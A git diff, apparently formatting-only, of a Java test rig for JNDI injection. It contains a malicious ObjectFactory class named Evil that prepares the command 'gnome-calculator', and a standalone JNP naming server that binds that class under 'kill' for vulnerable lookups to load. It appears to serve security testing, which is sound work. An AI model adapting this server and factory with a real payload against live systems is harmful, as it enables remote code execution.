986f834015e013a1106fb63409926cd0ee45c487
Pawel Smigiel <psmigiel@waratek.com>
2021-12-10 18:00:48 +0000

    only formatting

--- src/java/jndiserver/Evil.java
+++ src/java/jndiserver/Evil.java
@@ -5,7 +5,7 @@ import javax.naming.Name;
 import javax.naming.spi.ObjectFactory;
 import java.util.Hashtable;
 
-public  class  Evil  implements  ObjectFactory  {
+public class Evil implements ObjectFactory {
     @Override
     public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
         String commond = "gnome-calculator" ;
--- src/java/jndiserver/StandaloneJNDIServer.java
+++ src/java/jndiserver/StandaloneJNDIServer.java
@@ -13,54 +13,49 @@ import org.jnp.server.NamingBeanImpl;
 
 public class StandaloneJNDIServer implements Callable<Object> {
 
-public Object call() throws Exception {
-
-    setup();
-
-    return null;
-}
-
-@SuppressWarnings("unchecked")
-private void setup() throws Exception {
-
-    //configure the initial factory
-    //**in John´s code we did not have this**
-    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "org.jnp.interfaces.NamingContextFactory");
-
-    //start the naming info bean
-    final NamingBeanImpl _naming = new NamingBeanImpl();
-    _naming.start();
-
-    //start the jnp serve
-    final Main _server = new Main();
-    _server.setNamingInfo(_naming);
-    _server.setPort(15400);
-    _server.setBindAddress(InetAddress.getLocalHost().getHostName());
-    _server.start();
-
-/* PSM I do not need that:
-    //configure the environment for initial context
-    final Hashtable _properties = new Hashtable();
-    _properties.put(Context.INITIAL_CONTEXT_FACTORY, "org.jnp.interfaces.NamingContextFactory");
-    _properties.put(Context.PROVIDER_URL,            "jnp://10.10.10.200:5400");
-*/
-
-    //bind a name
-    final Context _context = new InitialContext();
-    _context.bind("jdbc", "myJDBC");
-    _context.bind("kill", Evil.class);
-    _context.bind("clazz", String.class);
-}
-
-public static void main(String...args){
-
-    try{
-
-        new StandaloneJNDIServer().call();
-
-    }catch(Exception _e){
-        _e.printStackTrace();
+    public Object call() throws Exception {
+        setup();
+        return null;
     }
 
-}
+    @SuppressWarnings("unchecked")
+    private void setup() throws Exception {
+
+        //configure the initial factory
+        //**in John´s code we did not have this**
+        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "org.jnp.interfaces.NamingContextFactory");
+
+        //start the naming info bean
+        final NamingBeanImpl _naming = new NamingBeanImpl();
+        _naming.start();
+
+        //start the jnp serve
+        final Main _server = new Main();
+        _server.setNamingInfo(_naming);
+        _server.setPort(15400);
+        _server.setBindAddress(InetAddress.getLocalHost().getHostName());
+        _server.start();
+
+    /* PSM I do not need that:
+        //configure the environment for initial context
+        final Hashtable _properties = new Hashtable();
+        _properties.put(Context.INITIAL_CONTEXT_FACTORY, "org.jnp.interfaces.NamingContextFactory");
+        _properties.put(Context.PROVIDER_URL,            "jnp://10.10.10.200:5400");
+    */
+
+        //bind a name
+        final Context _context = new InitialContext();
+        _context.bind("jdbc", "myJDBC");
+        _context.bind("kill", Evil.class);
+        _context.bind("clazz", String.class);
+    }
+
+    public static void main(String... args) {
+        try{
+            new StandaloneJNDIServer().call();
+        } catch(Exception _e){
+            _e.printStackTrace();
+        }
+
+    }
 }
